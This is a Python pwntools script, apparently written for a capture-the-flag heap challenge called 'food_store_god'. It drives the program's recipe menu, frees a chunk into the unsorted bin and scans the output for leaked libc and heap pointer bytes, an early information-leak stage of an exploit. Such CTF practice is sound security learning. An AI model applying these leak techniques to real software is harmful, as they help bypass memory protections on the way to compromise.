import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
os.environ['LOG']='error'
from pwn import *
DIR='/mnt/c/Users/ha/Downloads/pwn'
p=process([DIR+'/ld-2.24.so','--library-path',DIR,DIR+'/food_store_god'],env={'LD_LIBRARY_PATH':DIR})
def ru(x,**k): return p.recvuntil(x,**k)
def sl(x): p.sendline(x if isinstance(x,bytes) else str(x).encode())
ru(b'Your name: '); sl(b'A'*7)
def add(title,ings=(b'0',)):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'1'); ru(b'Magic : '); m=p.recvline().strip()
    ru(b'Title :'); sl(title)
    for i,ing in enumerate(ings):
        ru(b'Choose ingredient :'); sl(ing); ru(b'Add more ingredient ? (1/Yes,2/No) : '); sl(b'1' if i<len(ings)-1 else b'2')
    ru(b'Your choice: '); sl(b'4'); return m
def rm(t): ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'2'); ru(b'Title :'); sl(t); ru(b'Your choice: '); sl(b'4')
def cook(t): ru(b'Your choice: '); sl(b'5'); ru(b'What do you want to cook :'); sl(t); 
def show_r():
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'3'); d=ru(b'Your choice: '); sl(b'4'); return d
def show_d_via_sell():
    ru(b'Your choice: '); sl(b'4'); ru(b'Your choice: '); sl(b'2'); # sell
    d=ru(b'What do you want to sell ? :'); sl(b'99999'); # invalid -> not found
    d2=ru(b'Your choice: '); sl(b'4'); return d+d2

def scanbytes(tag,data):
    # look for 0x7f (libc high byte) or heap 0x55/0x56 within 6-byte windows
    hits=[]
    for i in range(len(data)-5):
        w=data[i:i+6]
        if (w[5]==0x7f or w[4]==0x7f) and w[0]!=0:
            hits.append((i,w.hex()))
    if hits: print("  [%s] possible libc bytes:"%tag, hits[:4])
    # also raw: any run with \x7f
    if b'\x7f' in data: print("  [%s] contains 0x7f at"%tag, [i for i,c in enumerate(data) if c==0x7f][:6])

# cook needs ingredients; Beef noodles cookable (Flouir+Beef). cook it, creating dishes
try:
    cook(b'Beef noodles'); ru(b'Done !')
    cook(b'Beef noodles'); ru(b'Done !')
except Exception as e: print("cook err",e)
# free a recipe to put libc in unsorted
add(b'Z1'); rm(b'Z1')
d=show_r(); scanbytes('show_r',d)
dd=show_d_via_sell(); scanbytes('show_d',dd)
print("show_r len",len(d),"show_d len",len(dd))
sys.stdout.buffer.write(b'RAW_SHOWR:'+d[:400]+b'\n')
sys.stdout.buffer.write(b'RAW_SHOWD:'+dd[:400]+b'\n')
p.close()
